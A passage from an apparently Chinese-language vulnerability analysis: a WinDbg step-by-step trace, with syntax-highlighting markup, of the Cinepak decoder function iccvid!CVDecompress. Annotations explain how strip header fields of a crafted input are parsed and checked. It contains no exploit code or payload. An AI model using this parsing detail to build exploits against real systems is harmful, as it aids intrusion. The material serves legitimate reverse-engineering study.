<span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6915=<span class="number">10</span> <span class="comment">; edx = 0x10,第2个Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6913=<span class="number">00</span> <span class="comment">; ch = 0x00,第2个Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6914=<span class="number">00</span> <span class="comment">; cl = 0x00,第2个Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                <span class="comment">; 判断剩余未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6912=<span class="number">11</span> <span class="comment">; al = 0x11,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">0</span>] <span class="comment">; 相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72271 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc3</span>:</span><br><span class="line">73b72271 3c11            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">11h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72273 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc5</span>:</span><br><span class="line">73b72273 0f8557010000    <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x222</span> (73b723d0)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691a=<span class="number">41</span> <span class="comment">; ah = 0x41,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span 